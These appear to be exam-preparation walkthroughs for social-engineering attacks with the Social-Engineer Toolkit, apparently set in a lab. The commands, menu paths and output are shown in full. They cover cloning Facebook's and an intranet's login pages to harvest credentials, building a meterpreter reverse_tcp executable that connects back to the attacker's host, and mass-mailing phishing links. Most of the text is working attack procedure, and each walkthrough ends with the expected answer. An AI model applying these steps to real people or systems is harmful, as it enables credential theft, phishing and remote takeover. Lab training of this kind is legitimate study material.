# 08 Social Engineering — full walkthroughs

---

## Walkthrough 1: "Clone the Facebook login page with SET and capture the victim's credentials"

**Type:** credential harvesting | **Difficulty:** easy | **Time:** 3–5 min

1. Find your attacker IP:
   ```bash
   ip -4 addr show eth0 | awk '/inet /{print $2}'
   ```
   Note it — this is `<LHOST>`.
2. Free up port 80:
   ```bash
   sudo systemctl stop apache2
   ```
3. Launch SET:
   ```bash
   sudo setoolkit
   ```
4. Navigate the menus:
   ```
   1) Social-Engineering Attacks
   2) Website Attack Vectors
   3) Credential Harvester Attack Method
   2) Site Cloner
   IP address for POST back: <LHOST>
   Enter the url to clone: https://www.facebook.com
   ```
5. SET now serves the cloned page. Leave this terminal open.
6. On the victim: browse `http://<LHOST>/` → submit `testuser / Testp@ss1`.
7. Back in SET you'll see:
   ```
   [*] WE GOT A HIT! Printing the output:
   PARAM: email=testuser
   PARAM: pass=Testp@ss1
   ```
8. **Answer:** the captured username and password (or the file path `/root/.set/reports/harvester_*.txt`).

---

## Walkthrough 2: "Harvest creds from an internal login page at http://intranet.lab.local/login"

**Type:** internal phishing | **Difficulty:** easy | **Time:** 3–5 min

Same flow as Walkthrough 1, but when SET asks for the URL to clone, give:
```
http://intranet.lab.local/login
```

**Gotcha:** if the page uses JavaScript to submit, Site Cloner may not capture fields. Fall back to **Web Templates** (`1 → 2 → 3 → 1`) and pick `Google` or craft a manual HTML form pointing to `http://<LHOST>/`.

Verify the clone serves:
```bash
curl -s http://<LHOST>/ | grep -i "<form"
```

Watch for live hits:
```bash
sudo tail -f /root/.set/reports/harvester_*.txt
```

---

## Walkthrough 3: "Generate a malicious executable using SET's infection vector and catch the session"

**Type:** payload delivery | **Difficulty:** medium | **Time:** 5 min

1. Launch SET:
   ```bash
   sudo setoolkit
   ```
2. Menus:
   ```
   1) Social-Engineering Attacks
   3) Infectious Media Generator
   2) Standard Metasploit Executable
   ```
3. Pick payload — `windows/meterpreter/reverse_tcp` (option 2).
4. Provide `LHOST=<LHOST>` and `LPORT=4444`.
5. SET builds `payload.exe` in `~/.set/`. SET will also ask to start a listener — say yes. It auto-launches `multi/handler`.
6. Deliver `payload.exe` to the victim (USB, HTTP, email attachment). When executed:
   ```
   [*] Meterpreter session 1 opened
   meterpreter > getuid
   ```
7. **Answer:** proof of session + flag file at whatever path the question specifies.

**Backup (no SET):** use [msfvenom](../05-system-hacking/commands.md#msfvenom--payloads) directly.

---

## Walkthrough 4: "Send a phishing email with SET Mass Mailer to targets.txt"

**Type:** mass mail | **Difficulty:** easy | **Time:** 3 min

1. Prepare the list:
   ```bash
   cat > targets.txt <<EOF
   alice@victim.lab
   bob@victim.lab
   EOF
   ```
2. Launch SET → `1) Social-Engineering Attacks → 5) Mass Mailer Attack → 2) Mass Mailer`.
3. Provide:
   - Path to file: `/root/targets.txt`
   - From address, from name
   - SMTP: either Gmail (needs app password) or your own relay
   - Subject, priority, HTML/plain, body (point link at `http://<LHOST>/` from Walkthrough 1)
4. SET sends one-by-one and logs each.
5. **Answer:** confirmation of mails sent, plus any harvested creds from the cloned landing page.
